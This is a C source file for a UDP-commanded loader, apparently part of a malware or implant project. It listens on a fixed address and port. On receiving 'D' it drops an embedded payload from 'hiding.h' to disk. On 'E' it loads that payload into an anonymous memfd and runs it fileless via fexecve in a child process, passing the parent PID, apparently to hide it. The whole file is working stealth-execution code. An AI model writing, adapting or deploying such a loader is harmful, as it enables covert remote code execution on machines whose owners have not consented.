#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <wait.h>
#include <fcntl.h>
#include <sys/mman.h>   
#include <sys/stat.h>   
#include <signal.h>     
#include <sys/syscall.h> 
#include "hiding.h"

// Variables from hiding.h
extern unsigned char hiding_c[];
extern unsigned int hiding_c_len;

unsigned char *payload = hiding_c;
unsigned int payload_len = hiding_c_len;

void sigchld_handler(int s)
{
    while(waitpid(-1, NULL, WNOHANG) > 0); 
}

int main(void){
	 
	char *ip = "10.60.117.216";
	int port = 5000;

	int sockfd;
	struct sockaddr_in server_addr, client_addr;
	char buffer[2];
	socklen_t addr_size;
	int n;

	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (sockfd < 0) {
	    perror("[-]socket error");
	    exit(1);
	}

	memset(&server_addr, '\0', sizeof(server_addr));
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(port);
	server_addr.sin_addr.s_addr = inet_addr(ip);

	n = bind(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr));
	if (n < 0){
	    perror("[-]bind error");
	    exit(1);
	}

	bzero(buffer, sizeof(buffer));printf("---> %s\n", buffer);
	bzero(buffer, sizeof(buffer));
	addr_size = sizeof(client_addr);
	
	//--this is to register the handler function--//
	struct sigaction sa;
	sa.sa_handler = sigchld_handler;
	sigemptyset(&sa.sa_mask);
	sa.sa_flags = SA_RESTART;
	if (sigaction(SIGCHLD, &sa, NULL) == -1) {
		perror("sigaction");
		exit(1);
	}
	
	while(1)
	{
		recvfrom(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&client_addr, &addr_size);
		

		if(strcmp(buffer, "D") == 0)
		{
			printf("I got a D\n");
			
			int payload_fd = open("payload.c", O_WRONLY | O_CREAT | O_TRUNC, 0700);
			write(payload_fd, payload, payload_len);
			close(payload_fd); 
		} else if(strcmp(buffer, "E") == 0)
		{
			printf("I got an E (Execute command). Loading payload into memory...\n");
			
			int fd = syscall(__NR_memfd_create, "in_memory_payload", MFD_CLOEXEC);
			if (fd == -1) {
				perror("[-]syscall(memfd_create) failed");
			}

			ssize_t bytes_written = write(fd, payload, payload_len);
			if (bytes_written != payload_len) {
				perror("[-]write to memfd failed (Incomplete write)");
				close(fd);
			} else {
				printf("[+]Payload loaded into memory (%u bytes).\n", payload_len); 
			}
			
			pid_t p1fork = fork();
			
			if (p1fork == 0) {
				// Child process
				pid_t parentID = getppid();
				char pbuffer[16];
				sprintf(pbuffer, "%d", parentID);
				
				char *args[] = {"/proc/self/fd/in_memory_payload", pbuffer, NULL}; 
				char *envp[] = {NULL}; 
				
				printf("[+]Child (PID %d) executing in-memory payload...\n", getpid());
				
				fexecve(fd, args, envp);
				
				perror("[-]fexecve failed"); 
				exit(1); 
				
			} else if (p1fork > 0) {
				// Parent process
				printf("[+]Payload process started with PID: %d\n", p1fork);
				close(fd); 
			} else {
				perror("[-]fork error");
			}
		}
	}
	
	bzero(buffer, 2);

    return 0;
}